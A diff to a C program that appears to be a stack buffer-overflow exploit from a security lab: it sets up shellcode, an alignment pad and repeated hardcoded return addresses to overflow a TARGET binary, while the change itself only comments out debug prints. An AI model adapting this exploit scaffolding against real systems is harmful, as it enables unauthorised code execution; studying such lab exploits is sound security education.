@@ -29,11 +29,11 @@ int main(void)
     i++;
   }
   strcat(alignment, "\0");
-  fprintf(stderr, "alignment string = %s\n", alignment);
+  //fprintf(stderr, "alignment string = %s\n", alignment);
 
   //static char alignment[] = "\x90";
   static char sprepeat[] = "\x54\xf5\xff\xbf";
-  fprintf(stderr, "strlen(shellcode)=%ibytes\n", (int) strlen(shellcode));
+  //fprintf(stderr, "strlen(shellcode)=%ibytes\n", (int) strlen(shellcode));
 
   args[0] = TARGET; 
   //args[1] = strcat(shellcode, sprepeat);
@@ -65,7 +65,7 @@ int main(void)
           "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
           "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf";
 
-  fprintf(stderr, "args[1]=\"%s\"\n", args[1]);
+  //fprintf(stderr, "args[1]=\"%s\"\n", args[1]);
   args[2] = NULL;
   env[0] = NULL;
 
